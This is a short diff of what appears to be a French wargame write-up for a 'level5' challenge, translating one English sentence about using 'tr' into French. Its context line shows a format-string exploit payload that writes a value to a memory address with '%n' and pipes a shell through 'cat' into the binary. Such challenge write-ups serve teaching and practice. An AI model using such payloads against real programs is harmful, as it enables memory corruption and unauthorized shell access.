@@ -25,4 +25,4 @@ Voici le nouveau code :
 (echo $'\x38\x98\x04\x08%134513824d%4$n'; cat) | ./level5
 ```
 
-We can add ` | tr -d ' '` at the end to avoid waiting.
+On peut ajouter ` | tr -d ' '` pour éviter d'attendre la fin de l'écriture.
